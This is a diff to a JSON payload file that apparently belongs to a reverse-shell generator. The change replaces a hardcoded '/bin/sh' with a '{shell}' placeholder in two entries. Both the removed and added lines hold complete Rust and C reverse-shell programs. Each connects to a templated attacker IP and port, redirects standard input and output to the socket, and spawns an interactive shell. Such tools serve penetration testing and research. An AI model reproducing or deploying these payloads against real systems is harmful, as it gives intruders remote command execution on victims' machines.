@@ -356,7 +356,7 @@
     },
     {
         "name": "Rust",
-        "command": "use std::net::TcpStream;\nuse std::os::unix::io::{AsRawFd, FromRawFd};\nuse std::process::{Command, Stdio};\n\nfn main() {\n let s = TcpStream::connect(\"${values.ip}:${values.port}\").unwrap();\n let fd = s.as_raw_fd();\n Command::new(\"/bin/sh\")\n .arg(\"-i\")\n .stdin(unsafe { Stdio::from_raw_fd(fd) })\n .stdout(unsafe { Stdio::from_raw_fd(fd) })\n .stderr(unsafe { Stdio::from_raw_fd(fd) })\n .spawn()\n .unwrap()\n .wait()\n .unwrap();\n}",
+        "command": "use std::net::TcpStream;\nuse std::os::unix::io::{AsRawFd, FromRawFd};\nuse std::process::{Command, Stdio};\n\nfn main() {\n let s = TcpStream::connect(\"${values.ip}:${values.port}\").unwrap();\n let fd = s.as_raw_fd();\n Command::new(\"{shell}\")\n .arg(\"-i\")\n .stdin(unsafe { Stdio::from_raw_fd(fd) })\n .stdout(unsafe { Stdio::from_raw_fd(fd) })\n .stderr(unsafe { Stdio::from_raw_fd(fd) })\n .spawn()\n .unwrap()\n .wait()\n .unwrap();\n}",
         "tags": [
         "linux",
         "mac",
@@ -365,7 +365,7 @@
     },
     {
         "name": "C",
-        "command": "#include <stdio.h>\n#include <unistd.h>\n#include <netinet/in.h>\n#include <sys/types.h>\n#include <sys/socket.h>\n\n#define REMOTE_ADDR \"${values.ip}\"\n#define REMOTE_PORT ${values.port} \n\nint main(int argc, char *argv[])\n{\n struct sockaddr_in sa;\n int s;\n\n sa.sin_family = AF_INET;\n sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);\n sa.sin_port = htons(REMOTE_PORT);\n\n s = socket(AF_INET, SOCK_STREAM, 0);\n connect(s, (struct sockaddr *)&sa, sizeof(sa));\n dup2(s, 0);\n dup2(s, 1);\n dup2(s, 2);\n\n execve(\"/bin/sh\", 0, 0);\n return 0;\n}",
+        "command": "#include <stdio.h>\n#include <unistd.h>\n#include <netinet/in.h>\n#include <sys/types.h>\n#include <sys/socket.h>\n\n#define REMOTE_ADDR \"${values.ip}\"\n#define REMOTE_PORT ${values.port} \n\nint main(int argc, char *argv[])\n{\n struct sockaddr_in sa;\n int s;\n\n sa.sin_family = AF_INET;\n sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);\n sa.sin_port = htons(REMOTE_PORT);\n\n s = socket(AF_INET, SOCK_STREAM, 0);\n connect(s, (struct sockaddr *)&sa, sizeof(sa));\n dup2(s, 0);\n dup2(s, 1);\n dup2(s, 2);\n\n execve(\"{shell}\", 0, 0);\n return 0;\n}",
         "tags": [
         "linux",
         "mac",
